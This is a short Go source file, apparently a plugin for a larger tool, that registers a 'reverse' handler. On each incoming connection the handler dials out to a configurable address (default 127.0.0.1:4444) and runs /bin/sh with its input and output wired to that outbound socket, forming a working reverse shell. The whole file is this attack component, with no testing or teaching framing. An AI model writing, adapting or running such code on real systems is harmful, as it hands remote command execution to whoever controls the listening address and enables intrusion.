package handler

import (
	"context"
	"net"
	"os/exec"
)

type ReverseHandler struct {
	Connect string
}

func init() {
	Register("reverse", func(args map[string]string) (Handler, error) {
		connect := args["connect"]
		if connect == "" {
			connect = "127.0.0.1:4444"
		}
		return &ReverseHandler{Connect: connect}, nil
	})
}

func (h *ReverseHandler) Name() string { return "reverse" }

func (h *ReverseHandler) Handle(ctx context.Context, conn net.Conn) error {
	defer conn.Close()

	rev, err := net.Dial("tcp", h.Connect)
	if err != nil {
		return err
	}
	defer rev.Close()

	cmd := exec.CommandContext(ctx, "/bin/sh")
	cmd.Stdin = rev
	cmd.Stdout = rev
	cmd.Stderr = rev
	if err := cmd.Run(); err != nil {
		return err
	}
	_ = conn
	return nil
}
